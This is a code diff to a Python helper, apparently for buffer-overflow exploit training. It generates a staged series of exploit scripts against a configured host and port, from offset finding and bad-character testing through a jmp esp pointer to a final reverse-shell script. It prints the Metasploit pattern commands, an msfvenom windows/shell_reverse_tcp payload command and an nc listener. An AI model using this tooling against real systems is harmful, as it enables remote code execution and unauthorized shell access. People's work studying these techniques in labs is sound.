@@ -58,21 +58,151 @@ def gen1():
     fr.close()
     
     autoupdate_config()
+    
+    os.chmod(filename, 777)
+
+    print("You might want to run after the sctipt command: ")
+    print("./" + filename)
+    print("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $crashed_byte")
+    print("./simpleoverflowhelper.py 2 -g $pattern")
     pass
 
 def gen2():
+    filename = "2-offset.py"
+    template_filename = "2-offset-template.py"
+    if "output" in  simpleoverflowhelper.config:
+        filename = simpleoverflowhelper.config["output"]
+    fw = open(filename, 'w')
+    fr = open(template_filename, 'r')
+    template_lines = fr.readlines()
+    for line in template_lines:
+        line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
+        line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
+        line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
+        fw.write(line)
+    fw.close()
+    fr.close()
+    
+    autoupdate_config()
+    
+    os.chmod(filename, 777)
+
+    print("You might want to run after the sctipt command: ")
+    print("./" + filename)
+    print("./2-offset.py")
+    print("./2-offset.py")
+    print("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l $crashed_byte -q $overwritten_eip_pattern")
+    print("./simpleoverflowhelper.py 3 -g $offset")
     pass
 
 def gen3():
+    filename = "3-verify-overwritten.py"
+    template_filename = "3-verify-overwritten-template.py"
+    if "output" in  simpleoverflowhelper.config:
+        filename = simpleoverflowhelper.config["output"]
+    fw = open(filename, 'w')
+    fr = open(template_filename, 'r')
+    template_lines = fr.readlines()
+    for line in template_lines:
+        line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
+        line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
+        line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
+        fw.write(line)
+    fw.close()
+    fr.close()
+    
+    autoupdate_config()
+    
+    os.chmod(filename, 777)
+
+    print("You might want to run after the sctipt command: ")
+    print("./" + filename)
+    print("./3-verify-overwritten.py")
+    print("./simpleoverflowhelper.py 4 -b \"\"")
+    print("./simpleoverflowhelper.py 4 -b \"\\x00\"")
+    print("./simpleoverflowhelper.py 4 -b \"\\x00\\x0a\"")
     pass
 
 def gen4():
+    filename = "4-find-badchars.py"
+    template_filename = "4-find-badchars-template.py"
+    if "output" in  simpleoverflowhelper.config:
+        filename = simpleoverflowhelper.config["output"]
+    fw = open(filename, 'w')
+    fr = open(template_filename, 'r')
+    template_lines = fr.readlines()
+    for line in template_lines:
+        line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
+        line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
+        line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
+        fw.write(line)
+    fw.close()
+    fr.close()
+    
+    autoupdate_config()
+    
+    os.chmod(filename, 777)
+
+    print("You might want to run after the sctipt command: ")
+    print("./" + filename)
+    print("You might have not collected all bad chars also \\x00 is hightly one of them:")
+    print("./simpleoverflowhelper.py 4 -b \"" + simpleoverflowhelper.config["badchar"] + "\"")
+    print("After got all bad chars try to get the address of jmp esp instruction with no protection: ")
+    print("./simpleoverflowhelper.py 5 -j 65332193")
+    print("./4-find-badchars.py")
     pass
 
 def gen5():
+    filename = "5-verifiy-jmp-pointer.py"
+    template_filename = "5-verifiy-jmp-pointer-template.py"
+    if "output" in  simpleoverflowhelper.config:
+        filename = simpleoverflowhelper.config["output"]
+    fw = open(filename, 'w')
+    fr = open(template_filename, 'r')
+    template_lines = fr.readlines()
+    for line in template_lines:
+        line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
+        line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
+        line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
+        fw.write(line)
+    fw.close()
+    fr.close()
+    
+    autoupdate_config()
+    
+    os.chmod(filename, 777)
+
+    print("You might want to run after the sctipt command: ")
+    print("./" + filename)
+    print("msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread -f py -a x86 -b \"" + simpleoverflowhelper.config["badchar"] + "\" LPORT=4444 LHOST=$ip")
+    print("msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread -f py -a x86 -b \"" + simpleoverflowhelper.config["badchar"] + "\" LPORT=4444 LHOST=$ip > shell.txt")
+    print("nc -lnvp 4444")
+    print("./simpleoverflowhelper.py 6 -s shell.txt")
+    print("./5-verifiy-jmp-pointer.py")
     pass
 
 def gen6():
+    filename = "6-get-reverse-shell.py"
+    template_filename = "6-get-reverse-shell-template.py"
+    if "output" in  simpleoverflowhelper.config:
+        filename = simpleoverflowhelper.config["output"]
+    fw = open(filename, 'w')
+    fr = open(template_filename, 'r')
+    template_lines = fr.readlines()
+    for line in template_lines:
+        line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
+        line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
+        line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
+        fw.write(line)
+    fw.close()
+    fr.close()
+    
+    autoupdate_config()
+    
+    os.chmod(filename, 777)
+
+    print("You might want to run after the sctipt command: ")
+    print("./" + filename)
     pass
 
 def main():
